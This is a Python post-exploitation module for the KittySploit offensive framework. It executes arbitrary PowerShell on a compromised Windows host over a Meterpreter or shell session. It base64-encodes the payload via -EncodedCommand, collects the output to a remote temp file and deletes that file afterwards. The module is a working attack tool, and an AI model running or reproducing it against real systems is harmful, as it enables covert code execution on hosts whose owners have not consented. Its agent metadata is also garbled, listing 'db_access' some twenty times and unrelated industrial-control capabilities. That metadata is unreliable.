#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows PowerShell Exec",
        "description": "Execute a PowerShell command or script on a Windows shell or Meterpreter session and return its output.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    command = OptString("", "PowerShell command to execute", False)
    script = OptString("", "Inline PowerShell script to execute", False)
    script_file = OptFile("", "Local .ps1 file to read and execute", False)
    no_profile = OptBool(True, "Run PowerShell with -NoProfile", False)
    non_interactive = OptBool(True, "Run PowerShell with -NonInteractive", False)
    output_file = OptString("", "Remote file path to store output (empty = auto temp file)", False)
    cleanup = OptBool(True, "Delete the temporary remote output file when auto-generated", False)

    def _read_script_file(self) -> str:
        if not self.script_file:
            return ""
        if isinstance(self.script_file, list):
            return "".join(self.script_file)
        return str(self.script_file)

    def _get_payload(self) -> str:
        inline_script = str(self.script or "").strip()
        file_script = self._read_script_file().strip()
        command = str(self.command or "").strip()

        if inline_script:
            return inline_script
        if file_script:
            return file_script
        if command:
            return command

        raise ProcedureError(FailureType.ConfigurationError, "One of 'command', 'script', or 'script_file' must be set.")

    def _build_wrapper(self, payload: str, out_file: str) -> str:
        out_file_escaped = self.win_ps_single_quote(out_file)
        return (
            "$ProgressPreference='SilentlyContinue';"
            "$ErrorActionPreference='Continue';"
            f"& {{ {payload} }} 2>&1 | Out-File -FilePath '{out_file_escaped}' -Width 4096 -Encoding UTF8"
        )

    def check(self):
        return self.win_require_powershell()

    def run(self):
        if not self.check():
            return False

        payload = self._get_payload()
        auto_output = False
        out_file = str(self.output_file or "").strip()
        if not out_file:
            auto_output = True
            out_file = self.win_remote_temp_dir() + "\\powershell_exec.out"

        wrapped = self._build_wrapper(payload, out_file)
        encoded = self.win_encode_powershell(wrapped)
        prefix = self.win_powershell_cli_prefix(
            no_profile=bool(self.no_profile),
            non_interactive=bool(self.non_interactive),
        )
        command = f"{prefix} -EncodedCommand {encoded}"

        print_status("Executing PowerShell payload...")
        self.win_execute(command, timeout=60, wrap_job=False)

        result = self.win_read_remote_text(out_file)
        if result:
            print_success("PowerShell execution completed")
            print_info(result)
        else:
            print_warning("No output was returned")

        if auto_output and self.cleanup:
            self.win_delete_remote([out_file])

        return True
